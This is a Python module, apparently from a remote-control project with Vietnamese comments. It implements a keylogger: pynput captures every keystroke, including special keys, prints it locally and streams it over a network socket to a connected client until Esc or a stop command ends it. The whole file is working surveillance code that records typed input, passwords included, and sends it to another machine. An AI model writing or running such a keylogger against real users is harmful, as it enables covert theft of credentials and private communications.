# key_logger_server.py
from pynput import keyboard

def start_keylogger(client_socket):
    # Biến để lưu trữ các ký tự đã nhấn
    keys_pressed = ""
    MAX_LINE_LENGTH = 50  # Độ dài dòng tối đa trước khi tự động xuống dòng

    def on_press(key):
        nonlocal keys_pressed  # Sử dụng biến keys_pressed trong phạm vi hàm

        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char  # Lấy ký tự từ phím nhấn
        else:
            key_str = f' {str(key)} '  # Xử lý các phím đặc biệt

        # Nếu phím nhấn là Enter
        if key == keyboard.Key.enter:
            # In ra các phím đã nhấn mà không tạo dòng mới
            print(f'\rKeys pressed: {keys_pressed}')  # In ra trên cùng một dòng
            keys_pressed = ""  # Reset sau khi nhấn Enter
            print("Keys pressed: ", end='')  # Đưa con trỏ về đầu dòng để tiếp tục nhập
        else:
            # Cập nhật chuỗi ký tự đã nhấn và in ra trên cùng một dòng
            keys_pressed += key_str
            
            # Nếu chuỗi ký tự quá dài, xuống dòng mới mà không lặp lại ký tự
            if len(keys_pressed) > MAX_LINE_LENGTH:
                print(f'\rKeys pressed: {keys_pressed[:MAX_LINE_LENGTH]}')  # In phần đầu của dòng
                keys_pressed = keys_pressed[MAX_LINE_LENGTH:]  # Lưu phần còn lại để in tiếp
            print(f'\rKeys pressed: {keys_pressed}', end='')  # In ra trên cùng một dòng

        # Gửi dữ liệu phím nhấn qua client_socket
        try:
            client_socket.sendall(key_str.encode("utf-8"))
        except Exception as e:
            print(f'Error when sending data to client: {e}')
            return False  # Dừng keylogger nếu có lỗi khi gửi dữ liệu

    def on_release(key):
        if key == keyboard.Key.esc:
            print("\nKeylogger stopped by user.")
            client_socket.sendall("STOP_KEY_LOGGER".encode())  # Gửi lệnh dừng về server
            return False  # Dừng listener

    # Bắt đầu lắng nghe sự kiện phím nhấn và thả    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        try:
            listener.join()  # Chờ cho listener hoàn thành
        except Exception as e:
            print(f"Error in listener: {e}")
            
    # Lắng nghe lệnh từ client để dừng keylogger
    try:
        while True:
            data = client_socket.recv(1024)
            command = data.decode("utf-8")
            if command == "STOP_KEY_LOGGER":
                print("\nReceived stop command from client. Stopping keylogger...")
                break
    except Exception as e:
        print(f"Error receiving command from client: {e}")        

    # Gửi thông báo đến client khi keylogger dừng
    client_socket.sendall("KEYLOGGER_STOPPED".encode("utf-8"))
